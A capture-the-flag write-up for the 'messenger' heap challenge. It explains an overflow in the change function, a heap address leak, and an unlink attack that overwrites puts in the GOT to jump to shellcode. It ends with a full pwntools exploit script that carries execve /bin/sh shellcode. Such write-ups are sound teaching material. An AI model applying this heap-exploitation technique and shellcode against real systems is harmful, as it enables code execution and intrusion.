## Analyzing

64 bits ELF, Partial RELRO, with canary, no NX & PIE

There are five options:

[L]eave:

* Leave at most two messages.
* Free size to choose but max size is 32.
* The binary implements `malloc` itself. It's a little bit complex, but it's not the key point in this challenge.

[R]emove:

* The binary implements `free` itself, too. It will do the `unlink` operation. And that's what we gonna use to exploit.
* After the remove operation, the global variable which records the number of messages won't be changed.

[C]hange:

* Here is an overflow vulnerability. It will ask the size first, and it doesn't need to be the same as the size of original message. We would use this to change the chunk struct.

[V]iew:

* Use this to leak heap address.

[Q]uit:

* Quit the program.

Here is its heap struct(assume that there is already a size 8 message leaved):

```
            +-----------------------+
            | size      | fd        |  # Head
            +-----------------------+
            |           | size      |  # First message 
            | fd        | bk        |
            | data                  |
            +-----------------------+
            |           | size      |  # Top chunk
            |           | bk        |
            +-----------------------+
```

fd, bk will point the address where chunk stores its size instead of start of data or head of chunk.


## Exploit

First, leave a message of size 8, then use `change` to overflow the chunk struct. In the end of first step, use `view` to leak heap address.

Heap layout in the beginning:

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000400           # Top chunk
0x603020:      0x0000000000000000      0x0000000000603000
0x603030:      0x0000000000000000      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000000
0x603050:      0x0000000000000000      0x0000000000000000
```

Leave an message of size 8:

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x0000000041414141      0x0000000000000000
0x603040:      0x0000000000000000      0x00000000000003d0           # Top chunk
0x603050:      0x0000000000000000      0x0000000000603018
```

Use `change` to overflow, then leak the heap address:

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x4141414141414141      0x4141414141414141
0x603040:      0x4141414141414141      0x4141414141414141           # Top chunk
0x603050:      0x4141414141414141      0x0000000000603018
```

Here use the `view` function. It will output `'A'*40 + '\x18\x30\x60'`. The offset to the head of heap will be fixed.


Second, use `change` again to recover the heap struct since we don't want to mess up the heap struct. The struct will be the same as the second layout:

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x0000000041414141      0x0000000000000000
0x603040:      0x0000000000000000      0x00000000000003d0           # Top chunk
0x603050:      0x0000000000000000      0x0000000000603018
```

Third, leave another message of size 8:

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x0000000041414141      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000031           # Second message
0x603050:      0x0000000000603018      0x0000000000603018
0x603060:      0x0000000042424242      0x0000000000000000
0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk
0x603080:      0x0000000000000000      0x0000000000603048
```

Then, we need to use `unlink` to make puts.got.plt point to the address where we put shellcode. Take a look at the `free` code.

* buf - address where chunk stores data
* size_adr - address where chunk stores size
* buf_bk - bk of current_freed_chunk
* buf_fd - fd of current_freed_chunk
* qword_6020B0 - a list which stores address of message

```
# list struct
0x6020b0:      0x0000000000603000      0x0000000000000000           # Head  | Nothing
0x6020c0:      0x0000000000603030      0x0000000000603060           # First | Second
```

```c
size_adr = buf-24;
buf_bk = *(_QWORD *)(buf-24+16);
buf_fd = *(_QWORD *)(buf-24+8);
if (buf_bk)
    *(_QWORD *)(buf_bk+8) = buf_fd;                         // make buf_bk->fd = current_freed_chunk->fd
if (buf_fd)
    *(_QWORD *)(buf_fd+16) = buf_bk;                        // make buf_fd->bk = current_freed_chunk->bk
*(_QWORD *)(size_adr+8) = *(_QWORD *)(qword_6020B0+8)       // make current_freed_chunk->fd = first message  
if (*(_QWORD *)(qword_6020B0+8))
    *(_QWORD *)(*(_QWORD *)(qword_6020B0+8)+16) = size_adr; // make first message->bk = current_freed_chunk
*(_QWORD *)(qword_6020B0+8) = size_adr;                     // make Head->fd = current_freed_chunk
*(_QWORD *)size_adr &= 0xFFFFFFFFFFFFFFFE;                  // clear inuse bit
```

Use `buf_bk->fd = current_freed_chunk->fd`, to overwrite puts.got.plt. Make `buf_bk` = `puts.got.plt-8` and `buf_fd` = `address of shellcode`. And since `buf_bk->fd` will be `puts_got.plt`, `puts.got.plt` will point to `address of shellcode` after the `unlink` operation.

Here we need to use `change` to overwrite struct of second message first. Then free the second message.

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x4141414141414141      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000031           # Second message
0x603050:      0x00000000006030a8      0x0000000000602010
0x603060:      0x4242424242424242      0x0000000000000000
0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk
0x603080:      0x0000000000000000      0x0000000000603048
0x603090:      0x0000000000000000      0x0000000000000000
0x6030a0:      0x0000000000000000      0x00000000000016eb
0x6030b0:      0x0000000000000000      0x0000000000000000
0x6030c0:      shellcode
```

* `0x602010` - `puts_got-8`
* `0x6020a8` - address of shellcode

I only put `\xeb\x16` on `0x6030a8` since the side-effect of `unlink`. `unlink` would put `buf_fd` on `buf_bk->bk`.

```
0x603000:      0x0000000000000018      0x0000000000603048           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603048
0x603030:      0x4141414141414141      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000030           # Second message
0x603050:      0x00000000006030a8      0x0000000000602010
0x603060:      0x4242424242424242      0x0000000000000000
0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk
0x603080:      0x0000000000000000      0x0000000000603048
0x603090:      0x0000000000000000      0x0000000000000000
0x6030a0:      0x0000000000000000      0x00000000000016eb
0x6030b0:      0x0000000000000000      0x0000000000602010 <- buf_bk
0x6030c0:      shellcode
```

Therefore, if we put the **real shellcode** right on the `buf_fd`, our shellcode would be messed up. Use the `jmp 0x18` so that when calling `puts` it will jump to the address of **real shellcode** which is `0x6030c0`. Then... open the shell!


Final Exploit:

```python
#!/usr/bin/env python
# -*- coding: utf8 -*-
from pwn import * # pip install pwntools
import sys

r = process('./messenger')

def leave(size, msg):
    r.recvuntil('>>')
    r.sendline('L')
    r.recvuntil('size :')
    r.sendline(str(size))
    r.recvuntil('msg :')
    r.sendline(msg)

def change(idx, size, payload):
    r.recvuntil('>>')
    r.sendline('C')
    r.recvuntil('index :')
    r.sendline(str(idx))
    r.recvuntil('size :')
    r.sendline(str(size))
    r.recvuntil('msg :')
    r.send(payload)

def view(idx):
    r.recvuntil('>>')
    r.sendline('V')
    r.recvuntil('index :')
    r.sendline(str(idx))

def remove(idx):
    r.recvuntil('>>')
    r.sendline('R')
    r.recvuntil('index :')
    r.sendline(str(idx))

puts_got = 0x602018

# Leak top chunk
leave(8, 'A'*4)
change(0, 60, 'A'*40)
view(0)
r.recvuntil('A'*40)
x = r.recvline()[:-1]
heap = u64(x + '\x00'*(8-len(x))) - 0x18
log.info('heap : {}'.format(hex(heap)))

# Repair the heap struct
payload = 'A'*8 + p64(0)*2 + p64(0x3d0) + p64(0) + p64(heap+0x18)
change(0, 60, payload)

# Make another chunk and use overflow to make arbitratary free
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
leave(8, 'B'*4)
payload = 'A'*8
payload += p64(0)*2 + p64(0x31) + p64(heap+0xa8) + p64(puts_got-8)
payload += 'B'*8 + p64(0)*2 + p64(0x3a0) + p64(0) + p64(heap+0x48)
payload += p64(0)*3 + '\xeb\x16' +'\x00'*6 + p64(0)*2 + sc
change(0, len(payload)+4, payload)
remove(1)

r.interactive()
```
